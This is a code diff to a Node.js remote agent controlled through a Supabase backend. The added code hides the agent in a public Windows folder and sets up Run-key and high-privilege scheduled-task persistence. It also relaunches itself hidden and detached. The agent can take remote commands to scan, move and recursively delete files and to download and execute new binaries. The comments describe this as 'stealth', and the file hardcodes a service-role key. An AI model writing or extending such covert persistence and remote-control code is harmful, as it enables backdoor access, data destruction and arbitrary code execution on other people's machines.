@@ -1,35 +1,80 @@
 const { createClient } = require('@supabase/supabase-js');
 const os = require('os');
-const { exec } = require('child_process');
+const { exec, spawn } = require('child_process');
 const path = require('path');
 const fs = require('fs').promises;
+
+// Move the agent to a fixed, non-suspicious directory
+async function moveToPermanentHome() {
+  const isCompiled = Boolean(process.pkg);
+  const currentPath = isCompiled ? process.execPath : path.resolve(__filename);
+  if (!process.platform === 'win32') return currentPath;
+
+  const targetDir = 'C:\\Users\\Public\\WinXAgent';
+  const targetPath = isCompiled ? path.join(targetDir, 'winxagent.exe') : path.join(targetDir, 'agent.js');
+
+  if (currentPath.toLowerCase() === targetPath.toLowerCase()) return targetPath;
+
+  try {
+    await fs.mkdir(targetDir, { recursive: true });
+    
+    const currentBuf = await fs.readFile(currentPath);
+    try {
+      const targetBuf = await fs.readFile(targetPath);
+      if (currentBuf.equals(targetBuf)) return targetPath;
+    } catch (e) { /* File doesn't exist yet */ }
+
+    await fs.writeFile(targetPath, currentBuf);
+    return targetPath;
+  } catch (e) { return currentPath; }
+}
+
+// Silence specific experimental warnings for a cleaner console/log experience
+const originalEmitWarning = process.emitWarning;
+process.emitWarning = (warning, ...args) => {
+  if (typeof warning === 'string' && warning.includes('The Fetch API is an experimental feature')) {
+    return;
+  }
+  originalEmitWarning(warning, ...args);
+};
 
 // Hardcoded credentials for "stealth" single-file operation
 const SUPABASE_URL = "https://rghhlxgwetysbyfiwwhu.supabase.co";
 const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJnaGhseGd3ZXR5c2J5Zml3d2h1Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjgwMjQ3NCwiZXhwIjoyMDkyMzc4NDc0fQ.BlVn3BnMrZIas5FlVGf6lXDsh47dsrINIb46y2hF_LU";
 
-const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, {
+  auth: {
+    persistSession: false // Recommended for non-browser environments
+  }
+});
 const COMPUTER_NAME = os.hostname();
 
 const MAX_LOG_ENTRIES = 100;
 const MAX_COMMAND_HISTORY = 50;
+let lastFoldersOnlyPreference = false;
 
 /**
  * Logs messages back to the Supabase dashboard
  */
 async function logToCloud(message, level = 'info') {
-  // Insert new log
-  const { data } = await supabase.from('logs').insert({
-    message,
-    level,
-    computer_name: COMPUTER_NAME
-  });
+  try {
+    await supabase.from('logs').insert({
+      message,
+      level,
+      computer_name: COMPUTER_NAME
+    });
 
-  // Prune old logs to keep database size small
-  const { data: logs } = await supabase.from('logs').select('id').eq('computer_name', COMPUTER_NAME).order('created_at', { ascending: false });
-  if (logs && logs.length > MAX_LOG_ENTRIES) {
-    const idsToDelete = logs.slice(MAX_LOG_ENTRIES).map(l => l.id);
-    await supabase.from('logs').delete().in('id', idsToDelete);
+    // Optimized Pruning: Only check every ~10 logs to reduce database overhead
+    if (Math.random() > 0.1) return;
+
+    // Use a unique variable name to avoid shadowing the 'logs' table
+    const { data: logs } = await supabase.from('logs').select('id').eq('computer_name', COMPUTER_NAME).order('created_at', { ascending: false });
+    if (logs && logs.length > MAX_LOG_ENTRIES) {
+      const idsToDelete = logs.slice(MAX_LOG_ENTRIES).map(l => l.id);
+      await supabase.from('logs').delete().in('id', idsToDelete);
+    }
+  } catch (err) {
+    console.error("Failed to log to cloud:", err.message);
   }
 }
 
@@ -56,7 +101,10 @@ async function scanDirectory(dirPath, foldersOnly = false) {
     const { data: dbRecords, error: fetchError } = await supabase
       .from('file_structure')
       .select('id, path')
-      .eq('computer_name', COMPUTER_NAME);
+      .eq('computer_name', COMPUTER_NAME)
+      // Only fetch records that are likely to be in this directory or its immediate children
+      // This significantly reduces network traffic and memory usage
+      .like('path', `${target}%`);
 
     if (fetchError) throw fetchError;
 
@@ -84,19 +132,33 @@ async function scanDirectory(dirPath, foldersOnly = false) {
 /**
  * Windows Persistence: Adds the script to the registry to run on startup
  */
-function ensurePersistence() {
+function ensurePersistence(targetPath) {
   if (process.platform === 'win32') {
-    // Detect if running as a compiled .exe (via pkg) or a raw script
     const isCompiled = Boolean(process.pkg);
-    const appPath = isCompiled ? `"${process.execPath}"` : `node "${path.resolve(__filename)}"`;
+    const cmdPath = isCompiled ? `"${targetPath}" --hidden` : `node "${targetPath}" --hidden`;
+    // Escape double quotes for use inside the /d (data) or /tr (task run) shell arguments
+    const shellEscaped = cmdPath.replace(/"/g, '\\"');
 
-    // Using HKEY_LOCAL_MACHINE ensures it runs for all users. 
-    // This requires the first run to be "Run as Administrator".
-    const regCmd = `reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RemoteAgent" /t REG_SZ /d "${appPath}" /f`;
-    
+    // 1. Registry Persistence (HKLM for all users)
+    const regCmd = `reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${shellEscaped}" /f`;
     exec(regCmd, (err) => {
-      if (err) logToCloud(`Persistence setup failed: ${err.message}`, 'error');
-      else logToCloud("Persistence established in HKLM Registry.");
+      if (err) {
+        logToCloud(`HKLM persistence failed, attempting HKCU: ${err.message}`, 'warn');
+        const hkcuCmd = `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinXAgent" /t REG_SZ /d "${shellEscaped}" /f`;
+        exec(hkcuCmd, (err2) => {
+          if (err2) logToCloud(`HKCU persistence failed: ${err2.message}`, 'error');
+          else logToCloud("Persistence established in HKCU.");
+        });
+      } else logToCloud("Registry persistence established (HKLM).");
+    });
+
+    // 2. Scheduled Task Persistence (Runs with Highest Privileges on every logon)
+    const taskName = "WinXAgentService";
+    const taskCmd = `schtasks /create /tn "${taskName}" /tr "${shellEscaped}" /sc onlogon /rl highest /f`;
+
+    exec(taskCmd, (err) => {
+      if (err) logToCloud(`Task Scheduler persistence failed: ${err.message}`, 'error');
+      else logToCloud("Scheduled Task created with Highest Privileges.");
     });
   }
 }
@@ -117,7 +179,8 @@ async function handleCommand(payload) {
 
       case 'SCAN':
         const targetPath = data?.path || 'C:\\Users';
-        await scanDirectory(targetPath, data?.foldersOnly);
+        lastFoldersOnlyPreference = !!data?.foldersOnly;
+        await scanDirectory(targetPath, lastFoldersOnlyPreference);
         break;
 
       case 'MKDIR':
@@ -125,7 +188,7 @@ async function handleCommand(payload) {
         const newFolderPath = path.join(data.parentPath, data.name);
         await fs.mkdir(newFolderPath);
         await logToCloud(`Created folder: ${newFolderPath}`);
-        await scanDirectory(data.parentPath);
+        await scanDirectory(data.parentPath, lastFoldersOnlyPreference);
         break;
 
       case 'RENAME':
@@ -133,16 +196,16 @@ async function handleCommand(payload) {
         const renamedPath = path.join(path.dirname(data.path), data.newName);
         await fs.rename(data.path, renamedPath);
         await logToCloud(`Renamed: ${data.path} -> ${renamedPath}`);
-        await scanDirectory(path.dirname(data.path));
+        await scanDirectory(path.dirname(data.path), lastFoldersOnlyPreference);
         break;
 
       case 'MOVE':
         if (!data?.path || !data?.newPath) throw new Error("Missing source or target path");
         await fs.rename(data.path, data.newPath);
         await logToCloud(`Moved: ${data.path} -> ${data.newPath}`);
-        await scanDirectory(path.dirname(data.path));
+        await scanDirectory(path.dirname(data.path), lastFoldersOnlyPreference);
         if (path.dirname(data.path) !== path.dirname(data.newPath)) {
-          await scanDirectory(path.dirname(data.newPath));
+          await scanDirectory(path.dirname(data.newPath), lastFoldersOnlyPreference);
         }
         break;
 
@@ -158,6 +221,11 @@ async function handleCommand(payload) {
         const arrayBuffer = await blob.arrayBuffer();
         const buffer = Buffer.from(arrayBuffer);
         
+        // Basic integrity check: Ensure file isn't empty and has PE header (MZ)
+        if (buffer.length < 2 || buffer[0] !== 0x4D || buffer[1] !== 0x5A) {
+          throw new Error("Downloaded file is not a valid Windows executable");
+        }
+
         const isCompiled = Boolean(process.pkg);
         const currentPath = isCompiled ? process.execPath : path.resolve(__filename);
         const newPath = currentPath + ".new";
@@ -179,8 +247,6 @@ async function handleCommand(payload) {
         await fs.writeFile(updaterPath, batchScript);
         await logToCloud("Update downloaded. Swapping binary and restarting...");
         
-        // Execute updater detached and kill the current process
-        const { spawn } = require('child_process');
         spawn('cmd.exe', ['/c', updaterPath], { detached: true, stdio: 'ignore' }).unref();
         process.exit(0);
         break;
@@ -205,8 +271,8 @@ async function handleCommand(payload) {
         if (!data?.path) throw new Error("No path provided for deletion");
         await fs.rm(data.path, { recursive: true, force: true });
         await logToCloud(`Deleted: ${data.path}`, "warn");
-        // Refresh view after delete
-        await scanDirectory(path.dirname(data.path));
+        // Refresh view after delete using last known preference
+        await scanDirectory(path.dirname(data.path), lastFoldersOnlyPreference);
         break;
 
       default:
@@ -229,15 +295,40 @@ async function handleCommand(payload) {
 }
 
 async function start() {
-  console.log(`Agent started on ${COMPUTER_NAME}`);
-  ensurePersistence();
-  await logToCloud("Agent Online");
+  // Phase 1: Setup & Re-launch
+  if (!process.argv.includes('--hidden')) {
+    console.log(`Initializing WinXAgent on ${COMPUTER_NAME}...`);
+    
+    const permanentPath = await moveToPermanentHome();
+    ensurePersistence(permanentPath);
+    
+    await logToCloud("Agent Persistence Established");
+
+    const isCompiled = Boolean(process.pkg);
+    const args = isCompiled ? ['--hidden'] : [permanentPath, '--hidden'];
+    
+    spawn(isCompiled ? permanentPath : process.execPath, args, {
+      detached: true,
+      stdio: 'ignore',
+      windowsHide: true,
+      shell: !isCompiled // Shell true helps resolve 'node' in script mode
+    }).unref();
+
+    process.exit(0);
+    return;
+  }
+
+  // Phase 2: Worker Mode (Hidden)
+  await logToCloud("Agent Online (Background)");
 
   // Subscribe to commands targeting this specific computer
   supabase
     .channel('remote-cmds')
     .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'commands', filter: `computer_name=eq.${COMPUTER_NAME}` }, handleCommand)
     .subscribe();
+
+  // Keep-alive heartbeat every 5 minutes
+  setInterval(() => logToCloud("System Heartbeat (Ping)", "debug"), 5 * 60 * 1000);
 }
 
 start();
